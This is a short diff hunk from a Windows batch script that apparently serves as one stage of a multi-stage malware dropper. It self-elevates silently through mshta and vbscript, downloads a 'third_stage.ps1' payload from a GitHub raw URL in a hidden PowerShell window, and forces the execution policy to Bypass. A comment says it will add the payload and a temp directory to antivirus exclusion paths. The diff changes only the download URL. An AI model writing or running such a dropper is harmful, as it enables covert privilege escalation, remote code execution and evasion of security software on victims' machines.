@@ -3,7 +3,7 @@
 REM Script for self-elevation
 net file 1>NUL 2>NUL || start "" mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c pushd ""%~dp0"" && ""%~s0"" %*","","runas",0)(window.close) && exit
 
-powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/exper_shit/main/third_stage.ps1' -OutFile './third_stage.ps1'"
+powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/third_stage.ps1' -OutFile './third_stage.ps1'"
 powershell -windowstyle hidden -c "& {Set-ExecutionPolicy -ExecutionPolicy Bypass -Force}"
 
 REM Add third stage and temp dir to exclusion paths for insurance
